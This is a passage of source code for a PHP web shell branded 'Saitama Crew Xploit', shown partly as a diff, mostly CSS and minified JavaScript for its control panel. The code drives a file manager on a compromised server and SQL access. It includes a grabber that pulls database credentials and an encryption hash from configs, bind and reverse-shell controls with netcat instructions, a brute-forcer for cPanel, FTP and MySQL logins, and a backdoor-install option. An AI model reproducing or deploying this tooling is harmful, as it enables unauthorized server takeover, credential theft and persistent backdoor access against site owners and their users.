strong{background-color:#46647A}.button{padding:3px}#addup,.button{outline:none;cursor:pointer;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px;background-color:#000;color:green;border-radius:100px}#addup:hover,.button:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:disabled:hover{cursor:not-allowed}td{padding:'.($GLOBALS['DB_NAME']['show_icons']=='1'?'0':'1').'px}.myCheckbox{padding-left:2px}.myCheckbox label{display:inline-block;cursor:pointer;position:relative}.myCheckbox input[type=checkbox]{display:none}.myCheckbox label:before{content:"";display:inline-block;width:14px;height:13px;position:absolute;background-color:#aaa;box-shadow:inset 0 2px 3px 0 rgba(0,0,0,.3),0 1px 0 0 rgba(255,255,255,.8)}.myCheckbox label{margin-bottom:15px;padding-right:17px}.myCheckbox label:before{border-radius:100px}input[type=checkbox]:checked + label:before{content:"";background-color:#0E304A;background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:50% 50%;background-size:14px 14px;box-shadow:0 0 4px #0F0}#meunlist{font-family:Verdana,Geneva,sans-serif;color:#FFF;width:auto;border-right-width:7px;border-left-width:7px;height:auto;font-size:12px;font-weight:700;border-top-width:0;border-color:#0E304A;border-style:solid}.whole #meunlist ul{text-align:center;list-style-type:none;margin:0;padding:5px 5px 7px 2px}.whole #meunlist li{margin:0;padding:0;display:inline}.whole #meunlist a{font-family:arial,sans-serif;font-size:14px;text-decoration:none;font-weight:700;clear:both;width:100px;margin-right:-6px;border-right-width:1px;border-right-style:solid;border-right-color:#FFF;padding:3px 15px}.foot{font-family:Verdana,Geneva,sans-serif;margin:0;padding:0;width:100%;text-align:center;font-size:12px;color:#0E304A;border-right-width:7px;border-left-width:7px;border-bottom-width:7px;border-bottom-style:solid;border-right-style:solid;border-right-style:solid;border-left-style:solid;border-color:#0E304A}#text{text-align:center}input[type=submit]{cursor:pointer;background-image:url('.__showicon('btn').');background-repeat:no-repeat;background-position:50% 50%;background-size:23px 23px;background-color:#000;width:30px;height:30px;border:1px solid #27979B;border-radius:100px}textarea{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}textarea:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text],input[type=number],.alfa_custom_cmd_btn{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}input[type=submit]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:2px solid #27979B;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}select{padding:3px;width:162px;color:#FFE;text-shadow:#000 0 2px 7px;border:1px solid #0E304A;background:#000;text-decoration:none;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}select:hover{border:1px solid #27979B;box-shadow:0 0 4px #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}
+.foottable{width: 300px;font-weight: bold;'.(!@is_writable($GLOBALS['cwd'])?'}.dir{background-color:red;}':'}').'.main th{text-align:left;}.main a{color: #FFF;}.main tr:hover{background-color:#646464 !important;}.ml1{ border:1px solid #0E304A;padding:5px;margin:0;overflow: auto; }.bigarea{ width:99%; height:300px; }.alfa_custom_cmd_btn {padding: 5px;color: #24ff03;cursor: pointer;}.ajaxarea.filesman-active-content {display: block;}'.alfaCssLoadColors().'
 </style>';
 echo "<script type='text/javascript'>
 var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
 var a_ = '" . htmlspecialchars(@$_POST['a']) ."';
 var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
 var islinux = ".($GLOBALS['sys']!="win"?'true':'false').";
-var post_encryption_mode = ".(__saitama_POST_ENCRYPTION__?'true':'false').";";?>
-var saitama1_="",saitama2_="",saitama3_="",saitama4_="",saitama5_="",saitama6_="",saitama7_="",saitama8_="",saitama9_="",saitama10_="",d=document,mysql_cache={},editor_files={},editor_error=!0,editor_current_file="",php_temrinal_using_cgi=!1,is_minimized=!1,cgi_is_minimized=!1,options_window_is_minimized=!1,database_window_is_minimized=!1,rightclick_menu_context=null,can_hashchange_work=!0,saitama_can_add_opt=!1,saitama_before_do_action_id="",saitama_ace_editors={editor:null,eval:null},col_dumper_selected_data={},_saitama_AJAX_={},cgi_lang="",upcount=1,terminal_walk_index=[],saitama_current_fm_id=1,saitama_fm_id=0;function set(e,a,t,i,l,o,r,n,s,c,f,_,u){d.mf.a.value=null!=e?e:a_,d.mf.c.value=null!=a?a:c_,d.mf.saitama1.value=null!=t?t:"",d.mf.saitama2.value=null!=i?i:"",d.mf.saitama3.value=null!=l?l:"",d.mf.saitama4.value=null!=o?o:"",d.mf.saitama5.value=null!=r?r:"",d.mf.saitama6.value=null!=n?n:"",d.mf.saitama7.value=null!=s?s:"",d.mf.saitama8.value=null!=c?c:"",d.mf.saitama9.value=null!=f?f:"",d.mf.saitama10.value=null!=_?_:"",d.mf.charset.value=null!=u?u:charset_}function fc(e){var a=saitama_current_fm_id,t="a="+saitamab64("FilesMan")+"&c="+saitamab64(e.c.value)+"&saitama1="+saitamab64(e.saitama1.value)+"&ajax="+saitamab64("true")+"&",i="",l=0;if(d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked&&(l++,i+="f[]="+saitamab64(decodeURIComponent(e.value))+"&")}),0==l&&"paste"!=e.saitama1.value)return!1;switch(saitamaloader("filesman_holder_"+a,"block"),e.saitama1.value){case"delete":d.querySelectorAll("#filesman_holder_"+a+" .fmanager-row").forEach(function(e){var a=e.querySelector("input[type=checkbox]");a.checked&&".."!=a.value?e.remove():a.checked=!1}),d.querySelector("#filesman_holder_"+a+" .chkbx").checked=!1;break;case"copy":case"move":case"zip":case"unzip":d.querySelectorAll("#filesman_holder_"+a+" input[type=checkbox]:checked").forEach(function(e){e.checked=!1})}_Ajax(d.URL,t+i,function(e){saitamaloader("filesman_holder_"+a,"none"),saitamaFmngrContextRow()},!1,"filesman_holder_"+a)}function initDir(e){var a="",t="";islinux&&(a="<a class=\"header_pwd\" onclick=\"g('FilesMan','/');\" path='/' href='#action=fileman&path=/'>/</a>",t="/");var l=e.split("/"),o="",r=islinux?"/":"";for(i in"-1"!=l.indexOf("..")&&(l.splice(l.indexOf("..")-1,1),l.splice(l.indexOf(".."),1)),l)""!=l[i]&&(o+="<a onclick=\"g('FilesMan','"+r+l[i]+"/');\" path='"+r+l[i]+"/' href='#action=fileman&path="+r+l[i]+'/\' class="header_pwd">'+l[i]+"/</a>",r+=l[i]+"/");$("header_cwd").innerHTML=a+o+" ",saitamaInitCwdContext(),l=(l=t+l.join("/")).replace("//","/"),d.footer_form.c.value=l,$("footer_cwd").value=l,c_=l}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(e,a,t,i,l){var o=!1;return window.XMLHttpRequest?o=new XMLHttpRequest:window.ActiveXObject&&(o=new ActiveXObject("Microsoft.XMLHTTP")),void 0!==l&&(_saitama_AJAX_[l]=o),o?(o.onreadystatechange=function(){4==o.readyState&&200==o.status?"function"==typeof t&&(t(o.responseText,l),saitamaClearAjax(l)):4==o.readyState&&200!=o.status&&(saitamaAjaxError(o.status,l,o.statusText,o.responseText),saitamaClearAjax(l))},o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),void o.send(a)):void alert("Error !")}function saitamaClearAjax(e){_saitama_AJAX_.hasOwnProperty(e)&&delete _saitama_AJAX_[e]}function handleup(e,a){var t="__fnameup";if(0!=a&&(t="__fnameup"+a),e.files.length>1){for(var i="",l=0;l<e.files.length;l++)i+=e.files[0].name+", ";$(t).innerHTML=i}else e.files[0].name&&($(t).innerHTML=e.files[0].name)}function u(e){var a=!1,t=0,i=saitama_current_fm_id,l=new FormData,o="filesman_holder_"+i;l.append("a",saitamab64(e.a.value)),l.append("c",saitamab64(e.c.value)),l.append("saitama1",saitamab64(e.saitama1.value)),l.append("charset",saitamab64(e.charset.value)),l.append("ajax",saitamab64(e.ajax.value)),e.querySelectorAll("input[type=file]").forEach(function(e){if(0==e.value.length)return!1;if(e.files.length>1)for(var a=0;a<e.files.length;a++)l.append("f[]",e.files[a]);else l.append("f[]",e.files[0]);t++}),$("footerup").value="",$("__fnameup").innerHTML="";for(var r=1;r<=upcount;r++){var n=$("pfooterup_"+r);n&&n.parentNode.removeChild(n),upcount--}if(0==upcount&&upcount++,0==t)return!1;var s="up_bar_"+getRandom();$("up_bar_holder").insertAdjacentHTML("beforeend","<div id='"+s+"' class='up_bar'></div>");e.c.value;if(window.XMLHttpRequest?a=new XMLHttpRequest:window.ActiveXObject&&(a=new ActiveXObject("Microsoft.XMLHTTP")),a){var c=$(s);_saitama_AJAX_[s]=a,a.upload&&(c.style.display="block",a.upload.onprogress=function(e){var a=e.position||e.loaded,t=e.totalSize||e.total,i=Math.floor(a/t*1e3)/10+"%";c.style.width=i}),a.onload=function(e){200===a.status?c.style.display="none":saitamaAjaxError(a.status,"upload_area",a.statusText,a.responseText),saitamaClearAjax(s)},a.onreadystatechange=function(){if(4==a.readyState&&200==a.status){if("noperm"!=a.responseText&&"[]"!=a.responseText){var e,t=JSON.parse(a.responseText),l="",r=d.querySelectorAll("#"+o+" #filemanager_table tr").length-3;for(e in t){++r;var n=t[e].name,s=encodeURIComponent(n),c=t[e].size,f=t[e].perm,_=t[e].modify,u=t[e].owner,p=loadType(n,"file");try{d.querySelector("#"+o+" .fmanager-row a[fname='"+n+"']").parentElement.parentElement.parentElement.remove()}catch(e){}l+='<tr class="fmanager-row" id="tr_row_'+r+'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'+n+'" class="chkbx" id="checkbox'+r+'"><label for="checkbox'+r+'"></label></div></td><td id="td_row_'+r+'">'+p+'<div style="position:relative;display:inline-block;bottom:12px;"><a row="'+r+'" id="id_'+r+'" class="main_name" onclick="editor(\''+s+"','auto','','','','file');\" href=\"#action=fileman&amp;path="+c_+"&amp;file="+s+'" fname="'+n+'" ftype="file" path="'+c_+'" opt_title="">'+n+'</a></div></td><td><span style="font-weight:unset;" class="main_size">'+c+'</span></td><td><span style="font-weight:unset;" class="main_modify">'+_+'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'+u+'</span></td><td><a id="id_chmode_'+r+'" href="javascript:void(0)" onclick="editor(\''+s+"','chmod','','','','file')\">"+f+'</a></td><td><a id="id_rename_'+r+'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'rename','','','','file')\">R</a> <a id=\"id_touch_"+r+'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'touch','','','','file')\">T</a> <a id=\"id_edit_"+r+'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''+s+"', 'edit','','','','file')\">E</a> <a id=\"id_download_"+r+'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''+n+"', 'download')\">D</a><a id=\"id_delete_"+r+'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '+s+" # ?'); chk ? g('FilesMan',null,'delete', '"+s+"') : '';\"> X </a></td></tr>"}d.querySelector("#"+o+" #filemanager_last_tr").insertAdjacentHTML("beforebegin",l),saitamaShowNotification("File(s) uploaded successfully","Uploader"),saitamaFmngrContextRow()}else saitamaShowNotification("Folder has no permission...","Uploader","error");saitamaCheckCurrentFilesManTab(i)}},a.open("POST",d.URL),a.send(l)}}function saitamaCheckCurrentFilesManTab(e){-1==$("filesman_tab_"+e).classList.value.indexOf("filesman-tab-active")&&$("filesman_tab_"+e).classList.add("tab-is-done")}function g(a,c,saitama1,saitama2,saitama3,saitama4,saitama5,saitama6,saitama7,saitama8,saitama9,saitama10,charset){var fm_id=0==saitama_fm_id?saitama_current_fm_id:saitama_fm_id,fm_id2=saitama_fm_id,fm_path=null==c||0==c.length?c_:c,d_mf_c=fm_path,g_action_id=saitama_before_do_action_id;0==saitama_fm_id&&(set(a,c,saitama1,saitama2,saitama3,saitama4,saitama5,saitama6,saitama7,saitama8,saitama9,saitama10,charset),d_mf_c=d.mf.c.value),"GetConfig"!=a&&"download"!=saitama2&&islinux&&"/"!=d_mf_c.substr(0,1)&&(d_mf_c="/"+d_mf_c),"FilesMan"==a?(saitamaloader("filesman_holder_"+fm_id,"block"),g_action_id="filesman_holder_"+fm_id):""!=g_action_id?saitamaloader(g_action_id,"block"):"FilesTools"!=a&&"download"!=saitama2&&"GetConfig"!=a&&("sql"==a?(showEditor("database_window"),g_action_id=loadPopUpDatabase("")):"FilesMan"!=a&&(showEditor("options_window"),g_action_id=loadPopUpOpTions(a)),saitamaloader(g_action_id,"block"));for(var data="a="+saitamab64(a)+"&c="+saitamab64(d_mf_c)+"&",i=1;i<=10;i++)data+="saitama"+i+"="+saitamab64(eval("d.mf.saitama"+i+".value"))+"&";if("FilesMan"==a){var pagenum=d.querySelector("#"+g_action_id+" .page-number.active-page-number");null!=pagenum&&(data+="pagenum="+saitamab64(getCookie(g_action_id+"_page_number")),setCookie(g_action_id+"_page_number",1,2012))}if(data+="&ajax="+saitamab64("true"),"FilesTools"==a&&"download"==saitama2){saitamaLoaderOnTop("none");var dl=$("dlForm");return dl.a.value=saitamab64("dlfile"),dl.c.value=saitamab64(d_mf_c),dl.file.value=saitamab64(saitama1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data,function(e,t){evalJS(e);var i=!1;if(saitamaLoaderOnTop("none"),"sql"==a)return console.log(t),loadPopUpDatabase(e,t),!1;if("FilesMan"==a){saitamaloader("filesman_holder_"+fm_id,"none"),d.querySelector("#filesman_holder_"+fm_id).innerHTML=e,fm_path=fm_path.replace(/\/\//g,"/"),$("filesman_tab_"+fm_id).setAttribute("path",fm_path);var l=saitamaGetLastFolderName(fm_path);d.querySelector("#filesman_tab_"+fm_id+" span").innerHTML=l,saitamaFmngrContextRow(),"function"==typeof saitama1&&saitama1(e),saitamaCheckCurrentFilesManTab(fm_id)}else(options_window_is_minimized||"."==t.substr(0,1))&&"."==t.substr(0,1)&&(i=!0,t=t.substr(1),showEditor("options_window")),i||saitamaloader(t,"none"),loadPopUpOpTions(t,e),"phpeval"==a&&saitamaLoadAceEditor("PhpCode"),"coldumper"==a.substr(0,9)&&saitamaColDumperInit()},!1,""==g_action_id?"."+a:g_action_id),g_action_id="",0==fm_id2&&c!=c_&&c&&initDir(c)):(saitamaloader(saitama3,"block"),_Ajax(d.URL,data,function(e,a){var t=a;a=d.querySelector("#"+("id_db"!=a.substr(0,5)?"option_"+a:a));try{(e=JSON.parse(e)).host&&e.user&&e.dbname&&($("db_host")&&(a.querySelector("#db_host").value=e.host),$("db_user")&&(a.querySelector("#db_user").value=e.user),$("db_name")&&(a.querySelector("#db_name").value=e.dbname),$("db_pw")&&(a.querySelector("#db_pw").value=e.password),$("db_prefix")&&e.prefix&&(a.querySelector("#db_prefix").value=e.prefix),$("cc_encryption_hash")&&e.cc_encryption_hash&&(a.querySelector("#cc_encryption_hash").value=e.cc_encryption_hash))}catch(e){}saitamaloader(t,"none")},!1,saitama3))}function saitamaGetLastFolderName(e){var a=e.replace(/\/\//g,"/").split("/");for(var t in a)0==a[t].length&&a.splice(t,1);var i=a[a.length-1];return 0==i.length&&(i="/"),i}function saitamaloader(e,a){if(0==e.length)return!1;try{var t=$("loader_"+e);if(null==t&&"block"==a){var i=null;"editor"==e?i=d.querySelector("#editor .editor-modal"):"id_db"==e.substr(0,5)?i=$(e):"terminal_id"==e.substr(0,11)?i=$(e):"editor"==e.substr(0,6)?i=$(e):"cgiframe"==e?i=$("cgiframe"):"filesman_holder"==e.substr(0,15)?(i=$(e)).style.minHeight="300px":i=$("option_"+e),i.insertAdjacentHTML("afterbegin","<div id='loader_"+e+'\' class="options-loader-holder"><div parent="'+e+'" onclick="saitamaAjaxController(this);" class="stopAjax">[ Stop it ]</div><div class="saitamateam-loader-text">Saitama Crew Xploit</div><div class="saitama-ajax-error"></div><img src=\'http://solevisible.com/images/loader.svg\'></div>')}else"filesman_holder"==e.substr(0,15)&&($(e).style.minHeight="0"),null!=t&&(t.style.display=a)}catch(e){}}function fs(e){var a=e.getAttribute("db_id"),t=d.querySelector("#"+a+" div.sf");mysql_cache.hasOwnProperty(a)||(mysql_cache[a]={}),saitamaloader(a,"block");var i=t.querySelector("input[name=sql_host]").value,l=t.querySelector("input[name=sql_login]").value,o=t.querySelector("input[name=sql_pass]").value,r=t.querySelector("input[name=sql_base]")?t.querySelector("input[name=sql_base]").value:t.querySelector("select[name=sql_base]").value,n=t.querySelector("select[name=type]").value,s=t.querySelector("input[name=sql_count]").checked?"true":"";_Ajax(d.URL,"a="+saitamab64("Sql")+"&saitama1="+saitamab64("query")+"&saitama2=&c="+saitamab64(c_)+"&charset="+saitamab64("UTF-8")+"&type="+saitamab64(n)+"&sql_host="+saitamab64(i)+"&sql_login="+saitamab64(l)+"&sql_pass="+saitamab64(o)+"&sql_base="+saitamab64(r)+"&sql_count="+saitamab64(s)+"&current_mysql_id="+saitamab64(a)+"&ajax="+saitamab64("true"),function(e,a){loadPopUpDatabase(e,a),evalJS(e),saitamaloader(a,"none")},!1,a)}function ctlbc(e){var a=$("bcStatus"),t=$("bcipAction");"bind"==e.value?(t.style.display="none",a.innerHTML="<small>Press ` <font color='red'>>></font> ` button and run ` <font color='red'>nc server_ip port</font> ` on your computer</small>"):(t.style.display="inline-block",a.innerHTML="<small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small>")}function $(e){return d.getElementById(e)}function addnewup(){var e="footerup_"+upcount,a="pfooterup_"+upcount,t=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",i=d.createElement("p");i.innerHTML='<label class="inputfile" for="'+e+'"><span id="__fnameup'+upcount+'"></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id="'+e+'" type="file" name="f[]" onChange="handleup(this,'+upcount+');" multiple>',i.id=a,i.appendAfter($(t)),upcount++}function saitama_searcher_tool(e){switch(e){case"all":case"dirs":_saitamaSet(!0,"Disabled");break;case"files":_saitamaSet(!1,"php")}}function _saitamaSet(e,a){d.srch.ext.disabled=e,d.srch.ext.value=a}function dis_input(e){switch(e){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(e,a,t){c="21"!=a?"localhost":"ftp.example.com",$("port").disabled=e,$("port").value=a,$("target").value=c,$("protocol").value=t}function inBackdoor(e){"my"==e.value?$("backdoor_textarea").style.display="block":$("backdoor_textarea").style.display="none"}function saveByKey(e){return!("s"==String.fromCharCode(e.which).toLowerCase()&&e.ctrlKey||19==e.which)||($("editor_edit_area").onsubmit(),e.preventDefault(),!1)}function saitamaAjaxError(e,a,t,i){if(void 0!==a){var l=d.querySelector("#loader_"+a);null!=l&&(firewall="",403==e&&(firewall=" ~ FireWall Detected!"),l.querySelector("img").remove(),l.querySelector(".saitama-ajax-error").innerHTML=e+" ( "+t+firewall+" )",saitamaShowNotification(t,"Ajax","error"))}}function saitamaInitCwdContext(){d.querySelectorAll(".header_pwd").forEach(function(e){e.addEventListener("contextmenu",function(e){var a=e.target.getAttribute("path"),t=d.querySelector("#rightclick_menu > a[name=newtab]");t.setAttribute("href","javascript:void(0);"),t.removeAttribute("target"),t.onclick=function(){saitamaFilesManNewTab(a,"/")};var i=e.clientX,l=e.clientY;saitamaSortMenuItems(["newtab"]),saitamaRightClickMenu(i,l),e.preventDefault()})})}function saitamaRightClickMenu(e,a){rightclick_menu_context.top=a+"px",rightclick_menu_context.left=e+"px",rightclick_menu_context.visibility="visible",rightclick_menu_context.opacity="1"}function saitamaSortMenuItems(e){var a=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete","view_archive"],t=!1;for(var i in a){for(var l in t=!1,e)a[i]!=e[l]||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="block",t=!0);t||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="none")}}function saitamaAceChangeSetting(e,a){var t=e.options[e.selectedIndex].value,i=e.getAttribute("base"),l=saitama_ace_editors.editor;"eval"==i&&(l=saitama_ace_editors.eval);var o=e.getAttribute("ace_id");"lang"==a?l[o].session.setMode("ace/mode/"+t):"theme"==a&&l[o].setTheme("ace/theme/"+t),setCookie("saitama_ace_"+a+"_"+i,t,2012)}function saitamaAceChangeWrapMode(e,a){var t=saitama_ace_editors.editor;"eval"==a&&(t=saitama_ace_editors.eval);var i=e.getAttribute("ace_id");e.checked?t[i].session.setUseWrapMode(!0):t[i].session.setUseWrapMode(!1)}function saitamaAceChangeFontSize(e,a,t){var i=saitama_ace_editors.editor;"eval"==e&&(i=saitama_ace_editors.eval);var l=t.getAttribute("ace_id"),o=i[l].getFontSize();"+"==a?++o:--o,i[l].setFontSize(o),setCookie("saitama_ace_fontsize_"+e,o,2012)}function setCookie(e,a,t){var i=new Date;i.setTime(i.getTime()+24*t*60*60*1e3);var l="expires="+i.toUTCString();document.cookie=e+"="+a+";"+l+";path=/"}function getCookie(e){var a=("; "+document.cookie).split("; "+e+"=");if(2==a.length)return a.pop().split(";").shift()}function editorClose(e){if(d.body.style.overflow="visible",elem=$(e),elem.setAttribute("class","editor-anim-close"),"editor"==e){if(is_minimized=!1,null!=saitama_ace_editors.editor&&null!=saitama_ace_editors.editor){for(var a in saitama_ace_editors.editor)saitama_ace_editors.editor[a].destroy();saitama_ace_editors.editor=null,d.querySelector(".editor-tabs").innerHTML="",d.querySelector(".editor-content-holder").innerHTML=""}}else if("cgiloader"==e)php_temrinal_using_cgi&&(d.querySelector(".terminal-tabs").innerHTML="",d.querySelector(".terminal-contents").innerHTML=""),php_temrinal_using_cgi=!1,cgi_is_minimized=!1;else if("options_window"==e){if(options_window_is_minimized=!1,null!=saitama_ace_editors.eval){for(var a in saitama_ace_editors.eval)saitama_ace_editors.eval[a].destroy();saitama_ace_editors.eval=null,d.querySelectorAll(".php-evals").forEach(function(e){e.removeAttribute("ace")})}}else"database_window"==e&&(database_window_is_minimized=!1);setTimeout(function(){elem=$(e),elem.removeAttribute("class"),elem.style.display="none","options_window"==e&&(elem.querySelector(".options_tab").innerHTML="",elem.querySelector(".options_content").innerHTML="")},1e3),d.body.style.overflow="visible"}function popupWindowBackPosition(){var e={cgiloader:cgi_is_minimized,options_window:options_window_is_minimized,database_window:database_window_is_minimized,editor:is_minimized},a=[];for(var t in e)e[t]&&a.push(t);1==a.length?$(a[0]+"-minimized").style.top="30%":2==a.length?($(a[0]+"-minimized").style.top="20%",$(a[1]+"-minimized").style.top="50%"):3==a.length?($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="60%"):4==a.length&&($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="55%",$(a[3]+"-minimized").style.top="80%")}function showEditor(e){if($(e).setAttribute("class","editor-anim-show"),$(e+"-minimized").setAttribute("class","minimized-hide"),"editor"==e)is_minimized=!1;else if("cgiloader"==e)cgi_is_minimized=!1;else if("options_window"==e){options_window_is_minimized=!1;var a=d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active.tab-is-done");null!=a&&a.classList.remove("tab-is-done")}else"database_window"==e&&(database_window_is_minimized=!1);popupWindowBackPosition(),d.body.style.overflow="hidden"}function editorMinimize(e){$(e).setAttribute("class","editor-anim-minimize"),$(e+"-minimized").setAttribute("class","minimized-show"),"editor"==e?is_minimized=!0:"cgiloader"==e?cgi_is_minimized=!0:"options_window"==e?options_window_is_minimized=!0:"database_window"==e&&(database_window_is_minimized=!0),popupWindowBackPosition(),d.body.style.overflow="visible"}function clearEditorHistory(){if(confirm("Are u Sure?"))for(var e in editor_files)e!=editor_current_file&&removeHistory(e)}function isArchive(e){var a,t=[".tar.gz",".tar.bz2",".tar.z",".tar.xz",".zip",".zipx",".7z",".bz2",".gz",".rar",".tar",".tgz"];for(a in t)if(new RegExp("(.*)("+t[a].replace(/\./g,"\\.")+")$","gi").test(e))return!0;return!1}function editor(e,a,t,i,l,o){if("dir"==o&&".."==e)return!1;if("download"==a)return g("FilesTools",i,e,"download"),!1;var r="",n="",s="",c="",f=d.mf.c.value,_=!0;if(e=e.trim(),0==Object.keys(editor_files).length){var u=getCookie("saitama_history_files");try{for(var p in u=atob(u),editor_files=JSON.parse(u))insertToHistory(p,editor_files[p].file,0,editor_files[p].type)}catch(e){}}if("phar://"==e.substr(0,7))f=c_;else if(-1!=e.indexOf("/")){var m=e.split("/");e=m[m.length-1],delete m[m.length-1],f=m.join("/"),islinux&&(f="/"+f)}if(void 0===o&&(o=""),void 0!==i&&null!=i&&0!=i.length&&(f=i.trim()),"auto"==a&&isArchive(e))return saitamaSyncMenuToOpt(e,!0),!1;try{for(var v in editor_files)if(editor_files[v].file==decodeURIComponent(e)&&editor_files[v].pwd.replace(/\//g,"")==f.replace(/\//g,"")){_=!1,l=v;break}}catch(e){}if(editor_error=!0,void 0!==t&&0!=t.length&&null!=t&&(r=saitamab64(t)),void 0!==l&&null!=l&&0!=l.length)n=saitamab64(l),s=l,c=l.replace("file_","");else{var h="file_"+(c=getRandom(10));n=saitamab64(h),s=h}var b="editor_source_"+c;if(null==$(b)){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}d.querySelector(".editor-tabs").insertAdjacentHTML("beforeend","<div onclick='editorTabController(this);' opt_id='"+b+"' id='tab_"+b+"' class='editor-tab-name editor-tab-active'>"+decodeURIComponent(e)+" <img opt_id='"+b+"' onclick='closeEditorContent(this,event);return false;' title='[close]' src='http://solevisible.com/icons/menu/delete.svg'></div>"),d.querySelector(".editor-content-holder").insertAdjacentHTML("afterbegin","<div class='editor-contents editor-content-active' id='"+b+"'></div>")}return 0==is_minimized&&"none"==$("editor").style.display?($("editor").style.display="block",showEditor("editor"),saitamaloader(b,"block")):(is_minimized&&showEditor("editor"),null!=$(b)?saitamaloader(b,"block"):(saitamaloader("editor","block"),b="editor")),_Ajax(d.URL,"a="+saitamab64("FilesTools")+"&c="+saitamab64(f)+"&saitama1="+saitamab64(e)+"&saitama2="+saitamab64(a)+"&saitama3="+r+"&saitama4="+n+"&saitama5=&saitama6=&saitama7=&saitama8=&saitama9=&saitama10=&&ajax="+saitamab64("true"),function(t,i){var l=$("tab_"+i);try{null!=l&&((-1==l.classList.value.indexOf("editor-tab-active")||is_minimized)&&(l.classList.add("tab-is-done"),saitamaShowNotification("proccess is done...","Editor: "+l.innerText)),is_minimized&&saitamaUpdateOptionsBadge("editor"))}catch(t){}if("none"==$("editor").style.display?saitamaLoaderOnTop("none"):saitamaloader(i,"none"),r.length>0&&"edit"==a)return is_minimized||null!=l&&-1!=l.classList.value.indexOf("editor-tab-active")&&saitamaShowNotification("saved...!","Editor"),!1;if(null!=$(i)&&($(i).innerHTML=t),is_minimized&&saitamaShowNotification("proccess is done...","Editor: "+decodeURIComponent(e)),$("editor").style.display="block",evalJS(t),saitamaLoadAceEditor("view_ml_content"),"delete"!=a&&editor_error){var c=d.getElementsByClassName("is_active");0!=c.length&&(c[0].className="file-holder"),n=s,e=decodeURIComponent(e),!editor_files[n]&&_?(editor_files[n]={file:e,pwd:f,type:o},insertToHistory(n,e," is_active",o),"mkfile"==a&&g("FilesMan",null)):$(n).parentNode.className+=" is_active"}d.body.style.overflow="hidden",d.getElementsByClassName("filestools")[0].setAttribute("fid",n),editor_files[n]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[n].pwd+"/"+editor_files[n].file).replace(/\/\//g,"/")),editor_current_file=n,updateCookieEditor()},!1,b),!1}function 